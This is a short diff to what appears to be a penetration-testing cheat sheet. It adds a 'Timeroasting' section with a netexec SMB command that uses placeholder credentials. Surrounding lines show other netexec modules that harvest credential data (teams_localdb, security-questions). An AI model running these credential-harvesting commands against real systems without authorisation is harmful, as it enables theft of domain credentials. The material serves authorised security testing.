@@ -903,6 +903,12 @@ $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M teams_localdb
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M security-questions
 ```
 
+#### Timeroasting
+
+```console
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M timeroast
+```
+
 #### User Handling
 
 ##### Change User Password
